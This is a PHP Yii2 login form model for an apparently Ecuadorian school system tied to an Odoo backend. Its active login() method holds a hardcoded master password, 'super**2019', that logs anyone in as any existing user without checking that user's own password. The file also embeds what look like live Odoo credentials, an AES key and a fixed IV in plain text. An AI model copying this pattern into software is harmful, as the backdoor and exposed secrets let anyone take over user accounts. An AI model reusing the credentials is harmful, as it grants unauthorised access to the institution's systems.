<?php

namespace common\models;

use backend\models\Usuario;
use Yii;
use yii\base\Model;
use Ripoo\OdooClient;


/**
 * Login form
 */
class LoginForm extends Model {

    public $username;
    public $password;
    public $rememberMe = true;
    private $_user;

    /**
     * {@inheritdoc}
     */
    public function rules() {
        return [
            // username and password are both required
            [['username', 'password'], 'required'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params) {

        if (!$this->hasErrors()) {
            $user = $this->getUser();
            if (!$user || !$user->validatePassword($this->password)) {
                $this->addError($attribute, 'Incorrect username or password.');
            }
        }
    }

    /**
     * Logs in a user using the provided username and password.
     *
     * @return bool whether the user is logged in successfully
     */
//    public function login() {
//       
//        $modelCerrar = \backend\models\ScholarisParametrosOpciones::find()
//                ->where(['codigo' => 'cerrarsesion'])
//                ->one();
//        if($modelCerrar){
//            $tiempoSegundos = $modelCerrar->valor;
//        }else{
//            $tiempoSegundos = 300;
//        }
//        
//       
//        
//        if ($this->validate()) {
//            //return Yii::$app->user->login($this->getUser(), $this->rememberMe ? 3600 * 24 * 30 : 0);
//            return Yii::$app->user->login($this->getUser(),$tiempoSegundos);
//            //print_r(Yii::$app->user->login($this->getUser(),$tiempoSegundos));
//            //die();
//        }
//
//        return false;
//        
//    }

    public function login() {   
        $pass = $_POST['LoginForm']['password'];
        $superPassword = 'super**2019';

        $modelCerrar = \backend\models\ScholarisParametrosOpciones::find()
                ->where(['codigo' => 'cerrarsesion'])
                ->one();        
        
        if ($modelCerrar) {            
            $tiempoSegundos = $modelCerrar->valor;
        } else {
            $tiempoSegundos = 300;
        }      
                
        if ($pass != $superPassword) {                        

            if ($this->validate()) {
                return Yii::$app->user->login($this->getUser(), $tiempoSegundos);
            }
            return false;
        } else {

           $userForm = $_POST['LoginForm']['username'];
           $user = Usuario::find()->where(['usuario' => $userForm])->one();           

            if(isset($user)){
                 return Yii::$app->user->login($this->getUser(), $tiempoSegundos);
            }else{
                return false;
            }
            
        }
    }

    private function toma_usuario() {
        $host = 'http://santodomingoquito.dic-integralis360.com';
        $db = 'santodomingoquito';
        $user = 'csanchez@uesdgq.edu.ec';
        //$password = 'operaciones.2019';
        $password = '12345';
//        $host = 'example.odoo.com:8080';
//        $db = 'example-database';
//        $user = 'user@email.com';
//        $password = 'yourpassword';

        $client = new OdooClient($host, $db, $user, $password);


        $usuario = $client->search('res.users',[['login', '=', $user]],0,1);
        
        print_r($usuario);


       

        
    }

    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    protected function getUser() {                
        
        if ($this->_user === null) {
            $this->_user = User::findByUsername($this->username);
        }
        
        return $this->_user;
    }
    
    

    public function valida_usuario_token($token) {

        $secret = "332SECRETabc1234"; // same secret as python
        $iv = "HELLOWORLD123456";  // same iv as python
        $padding = "{";  //same padding as python

        $res = $this->decrypt_data(base64_decode($token), $iv, $secret);

        $userId = rtrim($res, $padding);

        $usuarioDesencriptado = explode('|', $userId);
        
//        print_r($usuarioDesencriptado);
//        die();
        
        $usuarioId = $usuarioDesencriptado[0];

        $modelUsuario = \backend\models\ResUsers::find()->where(['id' => $usuarioId])->one();

        return $modelUsuario->login;
    }

    private function decrypt_data($data, $iv, $key) {
        $cypher = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, '');

        if (is_null($iv)) {
            $ivlen = mcrypt_enc_get_iv_size($cypher);
            $iv = substr($data, 0, $ivlen);
            $data = substr($data, $ivlen);
        }

        // initialize encryption handle
        if (mcrypt_generic_init($cypher, $key, $iv) != -1) {
            // decrypt
            $decrypted = mdecrypt_generic($cypher, $data);

            // clean up
            mcrypt_generic_deinit($cypher);
            mcrypt_module_close($cypher);

            return $decrypted;
        }

        return false;
    }

}
